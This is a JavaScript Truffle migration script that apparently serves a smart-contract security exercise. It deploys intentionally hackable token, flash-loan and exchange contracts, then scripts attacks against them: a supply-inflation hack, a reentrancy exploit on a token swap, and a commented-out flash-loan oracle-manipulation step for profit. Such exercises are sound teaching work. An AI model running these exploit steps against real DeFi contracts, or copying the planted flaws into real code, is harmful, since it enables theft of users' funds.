const TrojanCoinAfter = artifacts.require("TrojanCoinAfter");
const FlashLoanProvider1After = artifacts.require("FlashLoanProvider1After");
const HackableExchange1After = artifacts.require("HackableExchange1After");
const HackableExchange2After = artifacts.require("HackableExchange2After");


const TrojanCoinBefore = artifacts.require("TrojanCoinBefore");
const FlashLoanProvider1Before = artifacts.require("FlashLoanProvider1Before");
const HackableExchange1Before = artifacts.require("HackableExchange1Before");
const HackableExchange2Before = artifacts.require("HackableExchange2Before");

module.exports = async function(deployer, network, accounts) {

  await deployer.deploy(TrojanCoinBefore);
  await deployer.deploy(FlashLoanProvider1Before );
  await deployer.deploy(HackableExchange1Before);
  await deployer.deploy(HackableExchange2Before);

  await deployer.deploy(TrojanCoinAfter);
  await deployer.deploy(FlashLoanProvider1After );
  await deployer.deploy(HackableExchange1After);
  await deployer.deploy(HackableExchange2After);


  //You will be changing all the afters to befores for this when you copy/paste
        //First portion
        coin = await TrojanCoinAfter.deployed();
        coinSupply = parseInt(await coin.totalSupply.call());
        console.log("coinSupply originally is " + coinSupply );
        await coin.updateSupply('1100000000000000000000000');
        newSupply = parseInt(await coin.totalSupply.call());
        console.log("And now we will use one of our hacks to increase the coinSupply of trojancoin, so now it is: " + newSupply );




        //Second portion
        theContract = await HackableExchange1After.deployed();
        fromToken = await TrojanCoinAfter.deployed();
        flashPlatformWithDaiCoin = await FlashLoanProvider1After.deployed();

        await fromToken.approve(theContract.address, '100000000000000000000000000000000');
        amountTrading = 100000000;
        await flashPlatformWithDaiCoin.mintTokensTo(theContract.address, amountTrading*2);
        await fromToken.setMarketplace(theContract.address);
        await fromToken.activateRentry()
        startToTokenBalance = parseInt(await flashPlatformWithDaiCoin.balanceOf(accounts[0]));

        //The actual hack is here:
        await theContract.tokenToTokenSwap(fromToken.address, flashPlatformWithDaiCoin.address, amountTrading);

        //if we wanted to check that we executed this properly...
        endToTokenBalance = parseInt(await flashPlatformWithDaiCoin.balanceOf(accounts[0]));
        actualAmount = endToTokenBalance - startToTokenBalance;
        console.log(actualAmount)
        supposedToAmount = parseInt(await theContract.getTokenPrice.call(amountTrading));
        console.log("actual:"+ actualAmount)
        console.log("supposed to be" + supposedToAmount);


//Uncomment this for task
/*

        //Last piortion
        theMarginPlatformContract = await HackableExchange2After.deployed();
        fromToken = coin;
        oracleExchange = theContract;


        await theMarginPlatformContract.setOracleAddress(oracleExchange.address);
        await theMarginPlatformContract.createPosition(flashPlatformWithDaiCoin.address, fromToken.address, true, 2, 100000000);

        await fromToken.updateSupply('10000000000000000000000001')
        await fromToken.updateBalance('10000000000000000000000000')
        await fromToken.transfer(flashPlatformWithDaiCoin.address, '1000000000000000000000000')
        amountWithoutJacking = parseInt(await theMarginPlatformContract.closePosition.call());

        flashPlatformWithDaiCoin.borrowToken(fromToken.address, '1000000000000000000000000');
        await oracleExchange.tokenToTokenSwap(fromToken.address, flashPlatformWithDaiCoin.address, '100000000000000000000001');

        //After this you have successfully executed aoracle manipulation and pocked profits.
        amountClosed = parseInt(await theMarginPlatformContract.closePosition.call());
        theMarginPlatformContract.closePosition();

        console.log( "with jacking" + amountClosed);
        console.log( "without jacking" + amountWithoutJacking);
*/

}
